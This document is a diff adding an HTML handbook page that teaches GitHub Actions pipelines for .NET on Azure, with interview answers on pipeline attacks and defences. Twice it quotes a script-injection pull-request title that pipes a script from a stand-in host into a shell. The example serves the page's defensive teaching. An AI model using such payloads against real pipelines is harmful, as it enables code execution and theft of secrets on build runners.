@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GitHub Actions In Depth — GitHub Actions &amp; CI/CD</title>
+<meta name="description" content="Workflow structure, runners, caching, OIDC to Azure, reusable workflows, environments and approvals, deployment strategies and supply-chain security.">
+<meta name="keywords" content="GitHub Actions workflow jobs steps matrix runners self-hosted caching NuGet OIDC federated credentials environments approvals reusable workflows composite actions concurrency permissions pull_request_target artifact attestation Dependabot deployment slots">
+<link rel="stylesheet" href="../assets/handbook.css">
+</head>
+<body data-page="28-github-actions/index.html" data-root="..">
+
+<div class="hb-layout">
+<main class="hb-main">
+<article class="hb-article">
+
+  <header class="hb-pagehead">
+    <h1>GitHub Actions In Depth</h1>
+    <p class="subtitle">A good pipeline builds once, tests fast, authenticates without secrets, and makes the
+      approval mean something specific.</p>
+    <div class="meta">
+      <span class="lvl lvl-i">🟡 Intermediate</span>
+      <span class="lvl lvl-a">🔴 Advanced</span>
+      <span class="pill pill-must">🔥 Must know</span>
+    </div>
+  </header>
+
+  <div class="quickrev">
+    <div class="note-title">Quick revision</div>
+    <ul>
+      <li><strong>Build once, deploy the same artefact</strong> to every environment.</li>
+      <li><strong>OIDC to Azure</strong> — no service principal secret to store or rotate.</li>
+      <li><strong>Environments give approvals</strong> and scoped secrets.</li>
+      <li><strong>Cache NuGet</strong> keyed on the lock file, not on the commit.</li>
+      <li><strong>Set <code>permissions</code> explicitly</strong> — the default token is broad.</li>
+      <li><strong>Pin third-party actions to a SHA</strong>, not a tag.</li>
+      <li><strong><code>pull_request_target</code> is dangerous</strong> — it runs with secrets.</li>
+      <li><strong><code>concurrency</code></strong> to stop deployments racing each other.</li>
+    </ul>
+  </div>
+
+  <h2 id="structure">Structure <span class="lvl lvl-b">🟢 Beginner</span></h2>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Level</th><th>Is</th><th>Note</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Workflow</strong></td><td>A YAML file in <code>.github/workflows</code></td><td>Triggered by events</td></tr>
+        <tr><td><strong>Job</strong></td><td>A set of steps on one runner</td><td><strong>Jobs run in parallel</strong> unless you declare <code>needs</code></td></tr>
+        <tr><td><strong>Step</strong></td><td>A command or an action</td><td>Steps in a job share the filesystem</td></tr>
+        <tr><td><strong>Action</strong></td><td>A reusable unit</td><td>JavaScript, Docker, or composite</td></tr>
+        <tr><td><strong>Runner</strong></td><td>The machine</td><td><strong>A fresh VM per job</strong> — nothing persists between jobs</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="note tip">
+    <div class="note-title">Each job is a clean machine, and that shapes everything</div>
+    <p style="margin:0">Jobs don't share a filesystem. A separate job doesn't have your build output, your restored
+      packages, or your checked-out code unless you fetch them again.
+      <br><br>
+      So passing work between jobs means <strong>artifacts</strong> (upload in one, download in another) or
+      <strong>outputs</strong> for small values. That's the mechanism, and forgetting it is the most common
+      first-workflow mistake — a build job followed by a deploy job that finds nothing to deploy.
+      <br><br>
+      The upside is isolation: a job can't be affected by leftover state from another, and jobs run in
+      <strong>parallel by default</strong>, so independent work is concurrent for free. You only serialise where you
+      declare <code>needs</code>.
+      <br><br>
+      Which gives the shape of a good pipeline: <strong>fan out for independent checks</strong> — build, lint, unit
+      tests, security scan — then a single job that gates on all of them.</p>
+  </div>
+
+  <h2 id="pipeline">A .NET pipeline <span class="pill pill-must">🔥 Must know</span></h2>
+
+  <pre data-label="yaml — build once, test, deploy the same artefact" class="code-good"><code class="language-yaml">name: build-and-deploy
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+# Default to read-only. Grant more per job, not globally.
+permissions:
+  contents: read
+
+# Cancel superseded PR runs; never cancel a deploy mid-flight
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+env:
+  DOTNET_VERSION: '9.0.x'
+  DOTNET_SKIP_FIRST_TIME_EXPERIENCE: true
+  DOTNET_NOLOGO: true
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: ${{ env.DOTNET_VERSION }}
+          cache: true                          # caches NuGet, keyed on lock files
+          cache-dependency-path: '**/packages.lock.json'
+
+      - run: dotnet restore --locked-mode      # fail if the lock file is stale
+
+      - run: dotnet build --no-restore -c Release
+
+      - run: dotnet test --no-build -c Release
+             --logger trx --collect:"XPlat Code Coverage"
+             --results-directory ./TestResults
+
+      - name: Publish test results
+        uses: dorny/test-reporter@v1
+        if: always()                           # report even when tests failed
+        with:
+          name: tests
+          path: TestResults/*.trx
+          reporter: dotnet-trx
+
+      # Publish ONCE. Every environment deploys this exact output.
+      - run: dotnet publish src/Orders.Api -c Release -o ./publish --no-build
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: app
+          path: ./publish
+          retention-days: 30
+
+  deploy-test:
+    needs: build
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    environment:
+      name: test
+      url: https://orders-test.azurewebsites.net
+    permissions:
+      id-token: write                          # OIDC
+      contents: read
+    steps:
+      - uses: actions/download-artifact@v4
+        with: { name: app, path: ./publish }
+
+      - uses: azure/login@v2
+        with:                                  # no client secret
+          client-id: ${{ vars.AZURE_CLIENT_ID }}
+          tenant-id: ${{ vars.AZURE_TENANT_ID }}
+          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
+
+      - uses: azure/webapps-deploy@v3
+        with:
+          app-name: app-orders-test
+          package: ./publish
+
+  deploy-prod:
+    needs: deploy-test
+    runs-on: ubuntu-latest
+    environment:
+      name: production                         # required reviewers configured here
+      url: https://orders.example.com
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: actions/download-artifact@v4
+        with: { name: app, path: ./publish }
+
+      - uses: azure/login@v2
+        with:
+          client-id: ${{ vars.AZURE_CLIENT_ID }}
+          tenant-id: ${{ vars.AZURE_TENANT_ID }}
+          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
+
+      # Deploy to a slot, verify, then swap - zero downtime, instant rollback
+      - uses: azure/webapps-deploy@v3
+        with:
+          app-name: app-orders-prod
+          slot-name: staging
+          package: ./publish
+
+      - name: Smoke test the slot before it takes traffic
+        run: |
+          for i in {1..10}; do
+            code=$(curl -sf -o /dev/null -w "%{http_code}" \
+              https://app-orders-prod-staging.azurewebsites.net/health/ready) &amp;&amp; break
+            sleep 5
+          done
+          test "$code" = "200"
+
+      - run: az webapp deployment slot swap -g rg-orders-prod
+             -n app-orders-prod --slot staging --target-slot production</code></pre>
+
+  <div class="note senior">
+    <div class="note-title">Senior signal — build once is the property that makes the pipeline trustworthy</div>
+    <p style="margin:0">The most common structural mistake is rebuilding per environment: a build-and-deploy job for
+      test, another for production, each running <code>dotnet publish</code> again.
+      <br><br>
+      That breaks the guarantee the pipeline exists to provide. <strong>The thing you tested is not the thing you
+      shipped</strong> — it's a different build from the same source, and a transitive dependency that moved, a
+      different SDK patch on the runner, or a changed build variable makes them genuinely different bytes.
+      <br><br>
+      Build once, upload the artefact, and have every deploy job download <em>that</em>. Then "it passed in test" is
+      a statement about the artefact in production, not about a sibling of it.
+      <br><br>
+      It's also faster — one build instead of three — and it's the same reasoning as
+      <a href="../25-docker-kubernetes/index.html#why">deploying an image digest</a> rather than rebuilding from a
+      commit, and as <a href="../26-iac/practices.html#pipeline">applying a saved Terraform plan</a> rather than a
+      fresh one. <strong>The reviewed and tested artefact must be the executed artefact.</strong>
+      <br><br>
+      One caveat worth knowing: <code>dotnet publish</code> output can be runtime-specific, so a self-contained or
+      AOT publish needs one artefact per target runtime. That's a reason to have several artefacts, not a reason to
+      rebuild per environment.</p>
+  </div>
+
+  <h2 id="oidc">OIDC to Azure <span class="pill pill-must">🔥 Must know</span></h2>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th></th><th>Service principal secret</th><th>OIDC federated credential</th></tr></thead>
+      <tbody>
+        <tr><td>Stored in GitHub</td><td><strong>Yes, as a secret</strong></td><td><strong>Nothing</strong></td></tr>
+        <tr><td>Expiry</td><td>Expires; deploys break when it does</td><td>Per-run, minutes long</td></tr>
+        <tr><td>Rotation</td><td>Recurring manual task</td><td><strong>None</strong></td></tr>
+        <tr><td>If exfiltrated</td><td>Works from anywhere, until revoked</td><td><strong>Useless — bound to repo, branch, environment</strong></td></tr>
+        <tr><td>Requires</td><td>Nothing extra</td><td><code>permissions: id-token: write</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="note senior">
+    <div class="note-title">Senior signal — federate on the environment, not just the repository</div>
+    <p style="margin:0">The obvious win is that no credential is stored. The stronger property is
+      <strong>what the trust is bound to</strong>.
+      <br><br>
+      A federated credential in Entra names a <em>subject</em>, and GitHub's signed token must match it. So a
+      credential for <code>repo:org/app:environment:production</code> is only honoured for a job that actually
+      declares <code>environment: production</code> — and that environment is where your required reviewers
+      live.
+      <br><br>
+      Which means the approval gate and the credential are the <em>same</em> control. A job without the environment
+      cannot obtain the token at all.
+      <br><br>
+      Federating on the repository or on <code>ref:refs/heads/main</code> only is much weaker: any workflow in the
+      repository can request production credentials, so someone adding a workflow file bypasses the approval
+      entirely.
+      <br><br>
+      The same reasoning as <a href="../24-azure/config-secrets.html#managed-identity">managed identity</a> for
+      applications and <a href="../26-iac/practices.html#oidc">OIDC for Terraform</a>: the best credential is one
+      that doesn't exist, and the next best is one that only works in exactly one place.
+      <br><br>
+      Grant <code>id-token: write</code> <strong>per job</strong>, not at workflow level, so only the jobs that
+      deploy can mint a token.</p>
+  </div>
+
+  <h2 id="permissions">Permissions and untrusted input <span class="pill pill-must">🔥 Must know</span></h2>
+
+  <pre data-label="yaml — least privilege, and the injection to avoid" class="code-good"><code class="language-yaml">permissions:
+  contents: read            # workflow default: read-only
+
+jobs:
+  comment:
+    permissions:
+      contents: read
+      pull-requests: write  # ONLY this job can comment
+    steps:
+      # WRONG - PR title is attacker-controlled and is interpolated into a shell
+      # - run: echo "Reviewing ${{ github.event.pull_request.title }}"
+      #   A title of  "; curl evil.sh | sh; #  executes on the runner.
+
+      # RIGHT - pass through the environment; the shell never parses it
+      - run: echo "Reviewing $PR_TITLE"
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}</code></pre>
+
+  <div class="note danger">
+    <div class="note-title">Two supply-chain traps worth knowing by name</div>
+    <p style="margin:0"><strong>Script injection.</strong> <code>${{ }}</code> is substituted into the script
+      <em>as text</em> before the shell runs. So any attacker-controlled field — a pull request title, a branch name,
+      an issue body, a commit message — becomes shell code. Assign it to an environment variable and reference
+      <code>$VAR</code> instead, and the shell treats it as data.
+      <br><br>
+      <strong><code>pull_request_target</code>.</strong> Unlike <code>pull_request</code>, this trigger runs with
+      <strong>the base repository's secrets and a writable token</strong>. If such a workflow checks out the pull
+      request's head and executes anything from it — a build script, a test, an npm postinstall — then
+      <strong>anyone who can open a pull request from a fork can run code with your secrets.</strong>
+      <br><br>
+      That's not theoretical; it's been used to exfiltrate credentials from real repositories. Use
+      <code>pull_request</code> unless you have a specific reason, and if you must use
+      <code>pull_request_target</code>, never check out untrusted code in it.
+      <br><br>
+      Alongside those: <strong>pin third-party actions to a full commit SHA</strong>, not a tag.
+      <code>@v3</code> is a movable pointer the action's owner controls, so a compromised or repointed tag runs new
+      code in your pipeline with your permissions. A SHA is immutable. Dependabot can update pinned SHAs, so you
+      keep both safety and currency.
+      <br><br>
+      And set <strong><code>permissions</code> explicitly</strong>. The default <code>GITHUB_TOKEN</code> is broader
+      than most jobs need — declare <code>contents: read</code> at workflow level and add specific grants per
+      job.</p>
+  </div>
+
+  <h2 id="reuse">Reuse: reusable workflows and composite actions <span class="lvl lvl-i">🟡 Intermediate</span></h2>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th></th><th>Reusable workflow</th><th>Composite action</th></tr></thead>
+      <tbody>
+        <tr><td>Contains</td><td><strong>Whole jobs</strong></td><td><strong>A sequence of steps</strong></td></tr>
+        <tr><td>Called with</td><td><code>uses:</code> at job level</td><td><code>uses:</code> at step level</td></tr>
+        <tr><td>Runner</td><td>Chooses its own</td><td>Runs on the caller's</td></tr>
+        <tr><td>Secrets</td><td><code>secrets: inherit</code> or explicit</td><td>Passed as inputs</td></tr>
+        <tr><td>Use for</td><td><strong>A standard pipeline shape</strong> across repositories</td><td><strong>A repeated group of steps</strong> within a job</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <pre data-label="yaml — a called reusable workflow" class="code-good"><code class="language-yaml"># .github/workflows/dotnet-ci.yml  (in a central repository)
+on:
+  workflow_call:
+    inputs:
+      project:        { required: true,  type: string }
+      dotnet-version: { required: false, type: string, default: '9.0.x' }
+    outputs:
+      artifact-name:
+        value: ${{ jobs.build.outputs.artifact }}
+    secrets:
+      NUGET_FEED_TOKEN: { required: false }
+
+# Caller, in each service repository:
+# jobs:
+#   ci:
+#     uses: my-org/.github/.github/workflows/dotnet-ci.yml@a1b2c3d   # pin a SHA
+#     with:
+#       project: src/Orders.Api
+#     secrets: inherit</code></pre>
+
+  <div class="note tip">
+    <div class="note-title">Centralise the shape, and version it</div>
+    <p style="margin:0">Reusable workflows are how you stop twelve repositories having twelve slightly different CI
+      pipelines that all drift. Define the standard shape — restore, build, test, scan, publish, deploy — once, and
+      have each service call it with a few inputs.
+      <br><br>
+      Then improvements land everywhere: adding a security scan is one commit rather than twelve pull requests.
+      <br><br>
+      Two things to get right. <strong>Reference by SHA or tag, not by branch.</strong> A workflow referenced by
+      <code>@main</code> changes under every consumer without warning — so a mistake in the shared workflow breaks
+      every repository simultaneously, and there's no way to roll one back. Same reasoning as pinning a Terraform
+      module or a NuGet package version.
+      <br><br>
+      And <strong>be careful with <code>secrets: inherit</code></strong>. It's convenient and it passes
+      <em>everything</em> the caller has to the called workflow. For a workflow in your own organisation that's
+      usually acceptable; for anything less trusted, pass secrets explicitly so the surface is visible.</p>
+  </div>
+
+  <h2 id="performance">Making it fast <span class="lvl lvl-i">🟡 Intermediate</span></h2>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Lever</th><th>Effect</th><th>Watch for</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Cache NuGet</strong></td><td>Removes restore time</td><td><strong>Key on the lock file</strong>, never the commit SHA</td></tr>
+        <tr><td><strong><code>--no-restore</code> / <code>--no-build</code></strong></td><td>Stops redundant work</td><td>Requires consistent configuration between steps</td></tr>
+        <tr><td><strong>Parallel jobs</strong></td><td>Independent checks run concurrently</td><td>Each pays checkout and setup again</td></tr>
+        <tr><td><strong><code>paths</code> filters</strong></td><td>Skips irrelevant runs entirely</td><td>Required checks can end up never running</td></tr>
+        <tr><td><strong><code>concurrency</code></strong></td><td>Cancels superseded runs</td><td><strong>Never cancel in-progress deploys</strong></td></tr>
+        <tr><td>Test sharding via matrix</td><td>Splits a long suite</td><td>Coordination and coverage merging</td></tr>
+        <tr><td>Larger or self-hosted runners</td><td>More CPU, warm caches</td><td>Cost, and maintaining them</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="note warn">
+    <div class="note-title">A cache key on the commit SHA is a cache that never hits</div>
+    <p style="margin:0">The cache key must be derived from <strong>what the cache depends on</strong>. For NuGet
+      that's the lock files: <code>hashFiles('**/packages.lock.json')</code>.
+      <br><br>
+      Keying on the commit SHA produces a unique key per run, so every run misses, writes a new entry, and you get
+      the cost of caching with none of the benefit — plus the cache fills up and evicts things that would have hit.
+      <br><br>
+      Use <code>restore-keys</code> as a prefix fallback, so a changed lock file still restores the previous cache
+      and downloads only what's new rather than everything.
+      <br><br>
+      Two more notes. <strong>Central Package Management with <code>packages.lock.json</code></strong> plus
+      <code>dotnet restore --locked-mode</code> is worth adopting anyway: builds become reproducible, and restore
+      fails loudly if the lock file is stale rather than silently resolving a different version.
+      <br><br>
+      And caches are <strong>scoped by branch</strong>, with pull request branches able to read from the base branch
+      but not the reverse. So a cache warmed on a feature branch doesn't help anyone else — populate it on
+      <code>main</code>.</p>
+  </div>
+
+  <div class="note tip">
+    <div class="note-title"><code>concurrency</code>, and the deploy exception</div>
+    <p style="margin:0">Without a concurrency group, pushing three times to a branch runs three full pipelines, and
+      the first two are already obsolete. A group keyed on workflow and ref with
+      <code>cancel-in-progress</code> cancels the superseded ones — real savings on a busy repository.
+      <br><br>
+      <strong>Do not cancel in-progress deployments.</strong> Killing a deploy halfway leaves a partial rollout, a
+      half-applied migration, or a slot in an unknown state. Recovering from that is worse than a wasted minute.
+      <br><br>
+      So the pattern is <code>cancel-in-progress</code> only for pull request runs — as in the workflow above — and
+      a <em>separate, non-cancelling</em> concurrency group for deploy jobs so two deployments to the same
+      environment queue instead of racing.
+      <br><br>
+      That second part matters more than it sounds. Two concurrent deploys to one App Service can swap slots in the
+      wrong order and leave the older build live, with the pipeline reporting success.</p>
+  </div>
+
+  <div class="note warn">
+    <div class="note-title">Path filters and required checks interact badly</div>
+    <p style="margin:0">A <code>paths</code> filter that skips a workflow means the check <strong>never
+      reports</strong> — it isn't skipped-as-success, it simply doesn't exist. If that check is required for merge,
+      the pull request is blocked forever with no obvious reason.
+      <br><br>
+      The fix is a <strong>gate job that always runs</strong> and reports success when the real jobs were correctly
+      skipped, using <code>if: always()</code> and inspecting <code>needs.*.result</code>.
+      <br><br>
+      It's a small piece of plumbing that's easy to get wrong in the confusing direction: a naive version reports
+      success when a job <em>failed</em>, silently disabling the check you thought you had. Test it by deliberately
+      breaking a test and confirming the gate goes red.</p>
+  </div>
+
+  <h2 id="environments">Environments and approvals <span class="pill pill-must">🔥 Must know</span></h2>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Environment gives you</th><th>Detail</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Required reviewers</strong></td><td>The job waits for a human. <strong>Enforced by the platform</strong></td></tr>
+        <tr><td><strong>Scoped secrets and variables</strong></td><td>Production credentials only exist for production jobs</td></tr>
+        <tr><td><strong>Deployment branch rules</strong></td><td>Only <code>main</code> may deploy to production</td></tr>
+        <tr><td><strong>OIDC subject</strong></td><td>What the federated credential binds to</td></tr>
+        <tr><td>Wait timer</td><td>A forced delay, for a staged rollout</td></tr>
+        <tr><td>Deployment history</td><td>What was deployed where, and by whom</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="note senior">
+    <div class="note-title">Senior signal — environments are a security boundary, not a label</div>
+    <p style="margin:0">It's easy to treat an environment as documentation. It's doing three real jobs at once.
+      <br><br>
+      <strong>Secret scoping.</strong> A production secret attached to the production environment is unavailable to
+      any other job. So a workflow someone adds on a feature branch cannot read it — which is a genuine boundary,
+      not a convention.
+      <br><br>
+      <strong>Deployment branch rules.</strong> Restricting the production environment to <code>main</code> means a
+      job on any other ref cannot deploy there, whatever the YAML says.
+      <br><br>
+      <strong>The OIDC subject.</strong> As above, the federated credential binds to the environment, so the
+      approval gate and the credential become one control.
+      <br><br>
+      Stacked together, these mean "deploy to production" requires being on main, passing the required checks,
+      getting a human approval, and only then obtaining a short-lived token scoped to that environment. Each layer
+      is a repository setting rather than a promise about behaviour.
+      <br><br>
+      <strong>Structural, not procedural</strong> — the same principle as branch protection, Azure Policy in deny
+      mode, and read-only portal access. A control that depends on people doing the right thing isn't a
+      control.</p>
+  </div>
+
+  <div class="takeaways">
+    <span class="t-label">Key takeaways</span>
+    <ul>
+      <li>Each job is a fresh machine — pass work via artifacts or outputs.</li>
+      <li>Build once and deploy that artefact everywhere.</li>
+      <li>OIDC instead of a stored secret, federated on the <em>environment</em>.</li>
+      <li>Grant <code>id-token: write</code> per job, not workflow-wide.</li>
+      <li>Set <code>permissions: contents: read</code> as the default.</li>
+      <li>Never interpolate untrusted input into a shell — pass it via <code>env</code>.</li>
+      <li><code>pull_request_target</code> runs with secrets; don't check out untrusted code in it.</li>
+      <li>Pin third-party actions to a SHA and let Dependabot update them.</li>
+      <li>Cache keyed on lock files, with <code>restore-keys</code>; caches are branch-scoped.</li>
+      <li><code>cancel-in-progress</code> for pull requests only; queue deploys, never cancel them.</li>
+      <li>Path filters break required checks — add an always-running gate job and test it.</li>
+      <li>Reusable workflows pinned by SHA; be deliberate about <code>secrets: inherit</code>.</li>
+      <li>Environments give approvals, scoped secrets, branch rules and the OIDC subject.</li>
+      <li>Deploy to a slot, smoke test, then swap.</li>
+    </ul>
+  </div>
+
+  <h2 id="mistakes">Common mistakes</h2>
+  <ul>
+    <li><strong>Rebuilding per environment</strong>, so production runs a different build from the tested one.</li>
+    <li><strong>A service principal secret</strong> instead of OIDC.</li>
+    <li><strong>OIDC federated on the repository only</strong>, so any branch can reach production.</li>
+    <li><strong>No <code>permissions</code> block</strong>, leaving the token broader than needed.</li>
+    <li><strong>Interpolating a PR title into <code>run:</code></strong> — script injection.</li>
+    <li><strong><code>pull_request_target</code> checking out fork code.</strong></li>
+    <li><strong>Third-party actions pinned to a tag</strong> rather than a SHA.</li>
+    <li><strong>Cache keyed on the commit SHA</strong>, so it never hits.</li>
+    <li><strong><code>cancel-in-progress</code> on deploys</strong>, leaving a partial rollout.</li>
+    <li><strong>Concurrent deploys to one environment</strong>, swapping slots out of order.</li>
+    <li><strong>Path filters blocking required checks</strong> with no gate job.</li>
+    <li><strong>A gate job that reports success on failure.</strong></li>
+    <li><strong>Reusable workflows referenced by <code>@main</code></strong>, changing under consumers.</li>
+    <li><strong>No smoke test before a slot swap.</strong></li>
+    <li><strong>Secrets echoed in logs</strong> by a debug step.</li>
+  </ul>
+
+  <h2 id="interview-questions">Interview questions</h2>
+
+  <h3 id="q-intermediate">Intermediate</h3>
+
+  <details class="qa">
+    <summary>Design the CI/CD pipeline for a .NET API deploying to Azure. <span class="pill pill-must">🔥 Must know</span></summary>
+    <div class="qa-body">
+      <div class="say-it">
+        <span class="s-label">How I'd answer</span>
+        <p>"I'd organise it around one principle: <strong>build once, deploy that artefact everywhere</strong>. Most
+          of the other decisions follow from it."</p>
+        <p>"<strong>On a pull request:</strong> restore with NuGet caching, build, run unit and integration tests,
+          run analyzers and a security scan. Fast feedback, and nothing deploys."</p>
+        <p>"<strong>On merge to main:</strong> the same build, then <code>dotnet publish</code>
+          <em>once</em>, uploaded as an artefact. Every subsequent deploy job downloads <strong>that</strong>
+          artefact."</p>
+        <p>"That matters because rebuilding per environment breaks the guarantee the pipeline exists for. A rebuild
+          from the same commit isn't the same bytes — a transitive dependency may have moved, the runner's SDK patch
+          may differ. So 'it passed in test' would be a statement about a <em>sibling</em> of what's in production.
+          Building once makes it a statement about the artefact itself. It's also faster."</p>
+        <p>"<strong>Authentication is OIDC</strong>, not a stored service principal secret. Nothing to rotate,
+          nothing to leak — and the token is bound to the repository, branch and environment, so even exfiltrated it's
+          useless elsewhere. That needs <code>id-token: write</code>, and I'd grant it per job rather than
+          workflow-wide."</p>
+        <p>"<strong>Promotion through environments:</strong> test automatically, then production behind a
+          <strong>GitHub environment with required reviewers</strong>. The approval is enforced by the platform, not
+          by convention — and the environment also scopes the production secrets so no other job can read them, and
+          restricts deployment to <code>main</code>."</p>
+        <p>"I'd federate the OIDC credential on the <strong>environment</strong> specifically, so the approval gate
+          and the credential are the same control. Federating on the repository alone means anyone adding a workflow
+          file can request production credentials, which bypasses the approval entirely."</p>
+        <p>"<strong>The production deploy itself</strong> goes to a <strong>deployment slot</strong>, then smoke
+          tests the slot's health endpoint, then swaps. Zero downtime because the swap is a routing change, and
+          rollback is another swap — seconds, no rebuild. Deploying straight over the running app means downtime and
+          a rollback that costs a full redeploy."</p>
+        <p>"<strong>Database migrations</strong> run as a separate step before the app deploy, and must be
+          <strong>backward compatible</strong> — because during the swap and any canary period, both versions are
+          running against the same schema. That's expand-and-contract across releases, and it's the part of
+          deployment that pipelines don't solve for you."</p>
+        <p>"A few supporting details I'd include."</p>
+        <p>"<strong><code>permissions: contents: read</code></strong> as the workflow default, with specific grants
+          per job. The default token is broader than most jobs need."</p>
+        <p>"<strong>Concurrency</strong> — <code>cancel-in-progress</code> for pull request runs so superseded runs
+          don't burn minutes, but <strong>never for deploys</strong>. Cancelling a deploy halfway leaves a partial
+          rollout or a half-applied migration. Deploys to the same environment should queue, not race — two
+          concurrent deploys can swap slots in the wrong order and leave the older build live while the pipeline
+          reports success."</p>
+        <p>"<strong>Third-party actions pinned to a commit SHA</strong>, not a tag, since a tag is a movable pointer
+          someone else controls. Dependabot keeps the pins current."</p>
+        <p>"<strong>Post-deploy verification</strong> beyond the smoke test — watching error rate and latency in
+          Application Insights for a few minutes, with a documented rollback that's just a slot swap back."</p>
+        <p>"If there were several services, I'd move this into a <strong>reusable workflow</strong> so the shape is
+          defined once and improvements land everywhere — referenced by SHA, not by <code>@main</code>, so a mistake
+          in the shared workflow doesn't break every repository at once."</p>
+      </div>
+      <h5>What they're really checking</h5>
+      <ul>
+        <li>Do you build once and deploy the same artefact?</li>
+        <li>Do you use OIDC, federated on the environment?</li>
+        <li>Do you use environments for approvals and secret scoping?</li>
+        <li>Do you deploy via a slot with a smoke test?</li>
+        <li>Do you raise backward-compatible migrations?</li>
+        <li>Do you avoid cancelling deploys?</li>
+      </ul>
+      <h5>Weak answers</h5>
+      <ul>
+        <li><span class="redflag">Red flag:</span> build-and-deploy repeated per environment.</li>
+        <li><span class="redflag">Red flag:</span> a service principal secret in repository secrets.</li>
+        <li><span class="redflag">Red flag:</span> no approval gate and no rollback plan.</li>
+      </ul>
+      <div class="followups">
+        <div class="note-title">Likely follow-ups</div>
+        <ul>
+          <li>How do you handle a migration that renames a column?</li>
+          <li>What's your rollback, and how long does it take?</li>
+          <li>How do you stop two deploys racing?</li>
+        </ul>
+      </div>
+    </div>
+  </details>
+
+  <h3 id="q-advanced">Advanced</h3>
+
+  <details class="qa">
+    <summary>How would you attack a GitHub Actions pipeline, and how do you defend it? <span class="pill pill-senior">⭐ Senior-level</span></summary>
+    <div class="qa-body">
+      <div class="say-it">
+        <span class="s-label">How I'd answer</span>
+        <p>"The thing to internalise is that <strong>CI is a privileged execution environment</strong>. It holds
+          cloud credentials, can push to registries and can deploy to production. So it's a high-value target, and
+          it often has weaker controls than the production environment it deploys to."</p>
+        <p>"The main attack paths, and what stops each:"</p>
+        <p>"<strong>Script injection.</strong> <code>${{ }}</code> is substituted into the script as text
+          <em>before</em> the shell runs. So an attacker-controlled field — a pull request title, a branch name, an
+          issue body — becomes shell code. A title of <code>&quot;; curl evil.sh | sh; #</code> executes on the
+          runner with whatever the token can do."</p>
+        <p>"The fix is to <strong>pass untrusted values through <code>env</code></strong> and reference
+          <code>$VAR</code>, so the shell receives data rather than code. It's a small change and it's routinely
+          missed."</p>
+        <p>"<strong><code>pull_request_target</code>.</strong> This is the serious one. Unlike
+          <code>pull_request</code>, it runs with the <em>base</em> repository's secrets and a writable token. If such
+          a workflow checks out the pull request head and runs anything from it — a build script, a test, an npm
+          postinstall — then <strong>anyone who can open a fork PR executes code with your secrets</strong>. That's
+          been used to steal credentials from real repositories."</p>
+        <p>"So: use <code>pull_request</code> unless there's a specific need, and if <code>pull_request_target</code>
+          is genuinely required, never check out untrusted code in it. Do the privileged work in a separate workflow
+          triggered by <code>workflow_run</code>."</p>
+        <p>"<strong>A compromised third-party action.</strong> Referencing <code>@v3</code> is trusting a movable
+          pointer the action's owner controls — so a compromised account or a repointed tag runs new code in your
+          pipeline with your permissions. This has happened, notably with <code>tj-actions/changed-files</code>."</p>
+        <p>"<strong>Pin to a full commit SHA</strong>, which is immutable, and let Dependabot propose updates so you
+          keep currency without giving up immutability. I'd also allow-list which actions the organisation may use
+          at all."</p>
+        <p>"<strong>An over-permissive token.</strong> The default <code>GITHUB_TOKEN</code> is broader than most
+          jobs need, so any code execution on the runner inherits it. Declare
+          <code>permissions: contents: read</code> at workflow level and grant specific rights per job."</p>
+        <p>"<strong>Long-lived cloud credentials.</strong> A stored service principal secret works from anywhere, so
+          exfiltrating it is enough. <strong>OIDC</strong> removes it — tokens are per-run, minutes long, and bound to
+          repo, branch and environment, so a stolen one is useless. Federate on the environment, not just the
+          repository."</p>
+        <p>"<strong>Secrets in logs.</strong> GitHub masks known secret values, and it can't mask a
+          <em>derived</em> value — a base64-encoded secret, or one embedded in a JSON blob a debug step prints. So I'd
+          be careful about debug output, and treat any secret that has appeared in a log as compromised and rotate
+          it."</p>
+        <p>"<strong>Cache poisoning.</strong> Caches are writable from workflows, and a pull request branch can write
+          a cache the base branch may later read. So a poisoned dependency cache is a plausible path. Scoping
+          matters, and it's an argument for restore keys that are specific rather than broadly shared."</p>
+        <p>"<strong>Self-hosted runners on public repositories.</strong> A fork pull request can run on your runner,
+          and unlike GitHub-hosted runners it isn't ephemeral — so an attacker can leave things behind for the next
+          job, including a build of your code. If self-hosted runners are needed, they should be
+          <strong>ephemeral</strong> and never used for public repository pull requests."</p>
+        <p>"<strong>Defence in depth beyond the pipeline:</strong> branch protection so main can't be force-pushed
+          or bypassed; required reviews including on workflow files, since a change to
+          <code>.github/workflows</code> is a privilege change and deserves more scrutiny than application code;
+          environment approvals for production; and <strong>artifact attestation</strong> so you can verify a
+          deployed artefact came from the expected workflow and commit."</p>
+        <p>"The framing I'd offer: <strong>the pipeline usually has more privilege than any individual and less
+          scrutiny than production.</strong> So it should be reviewed like production infrastructure, and a change to
+          a workflow file should be treated as a change to who can do what — because that's exactly what it is."</p>
+      </div>
+      <h5>What they're really checking</h5>
+      <ul>
+        <li>Do you know script injection via <code>${{ }}</code>?</li>
+        <li>Do you know why <code>pull_request_target</code> is dangerous?</li>
+        <li>Do you pin actions to SHAs, and know why tags aren't enough?</li>
+        <li>Do you scope <code>permissions</code> and prefer OIDC?</li>
